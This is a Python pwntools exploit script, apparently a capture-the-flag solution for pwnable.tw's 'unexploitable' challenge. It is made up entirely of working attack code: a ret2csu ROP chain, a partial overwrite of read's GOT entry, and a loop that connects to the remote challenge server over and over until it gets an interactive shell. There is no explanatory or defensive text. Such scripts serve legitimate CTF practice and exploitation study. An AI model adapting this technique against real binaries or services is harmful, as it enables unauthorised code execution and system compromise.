from pwn import *
import sys

elf = ELF("unexploitable")
resolver = 0x400420
buff = 0x601a00
csu_init_1 = 0x4005E6
csu_init_2 = 0x4005D0
read_got = elf.got["read"]
main = 0x400544
mov_edi_rsp0x30 = 0x400600
libc = ELF("./libc_64.so.6")

log.info("libc_64.so.6: %s"%(hex(ELF('libc_64.so.6', checksec=False).sym["read"])))

def solve(check):

    # ret2csu
    payload1 = "A"*16 + p64(0)
    payload1 += p64(csu_init_1)
    payload1 += p64(0)
    payload1 += p64(0)  # rbx
    payload1 += p64(1)  # rbp
    payload1 += p64(read_got)  # call r12
    payload1 += p64(0) # r13d -> edi
    payload1 += p64(read_got) # r14 -> rsi
    payload1 += p64(0x2)  # r15->rdx
    payload1 += p64(csu_init_2)
    payload1 += p64(0)*7
    payload1 += p64(0x400571)
    sleep(3)
    p.send(payload1)
    payload2 = '\x67\x55'

    p.send(payload2)
    try:
        p.recv()
        log.info("failed")
    except:
        return
    check=True
    p.interactive()

count = 0

if __name__ == "__main__":
    check = False
    while True:
        try:
            count += 1
            print '-'*10 + ' ' + str(count) + ' ' + '-'*10   
            p = remote("chall.pwnable.tw", 10403)
            solve(check)
            if check:
                break
        except:
            p.close()
   
